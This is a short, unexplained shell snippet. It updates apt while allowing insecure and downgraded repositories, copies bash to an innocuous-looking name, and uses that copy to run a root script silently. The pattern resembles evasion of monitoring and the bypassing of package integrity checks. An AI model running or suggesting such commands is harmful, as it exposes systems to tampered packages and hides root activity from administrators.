
apt -o Acquire::AllowInsecureRepositories=true -o Acquire::AllowDowngradeToInsecureRepositories=true update

cp /bin/bash /bin/eb
eb /root/az.sh >/dev/null
